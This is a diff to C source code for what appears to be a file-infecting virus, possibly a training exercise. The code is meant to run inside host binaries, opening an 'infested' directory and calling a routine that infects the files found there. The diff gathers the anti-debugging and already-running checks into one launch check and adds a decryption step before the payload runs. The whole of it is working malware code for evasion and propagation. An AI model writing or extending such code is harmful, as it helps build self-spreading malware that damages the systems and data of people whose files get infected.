@@ -49,6 +49,15 @@ void FORCE_INLINE pop_registers()
 		);
 }
 
+int FORCE_INLINE can_be_launch()
+{
+	// if (PTRACE(PTRACE_TRACEME, 0, 0, 0) == -1) // error on bash maybe have to detach
+	// 	return 0;
+	if (is_proc_actif())
+		return 0;
+	return (1);
+}
+
 void payload()
 {
 	t_data data;
@@ -56,37 +65,35 @@ void payload()
 	char infested_dir[] = INFESTED_DIR;
 	char hello[] = "Hello there\n";
 
-	// check if in debugger
-	// check if pid running
-	if (PTRACE(PTRACE_TRACEME, 0, 0, 0) == -1)
-		return ;
-	if (is_proc_actif())
-		return ;
-	// decrypt next, go next
-	WRITE(1, hello, sizeof(hello));
+	WRITE(1, hello, sizeof(hello) - 1);
 	data.infos.pl_size = &payload_end - &payload_start;
 	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
 	if (fd < 0)
 		payload_end();
 	finder(data, fd);
 	CLOSE(fd);
-	// EXIT(0);
 	return ;
 }
 
 void start(void)
 {
-	payload();
+	if (can_be_launch())
+	{
+		payload();
+	}
 	EXIT(0);
 }
 
 void payload_start()
 {
 	push_registers();
-	payload();
+	if (can_be_launch())
+	{
+		decrypt();
+		payload();
+	}
 	pop_registers();
 	asm volatile (
-		// "int3;"
 		"jmp payload_end" : : :
 	);
 }
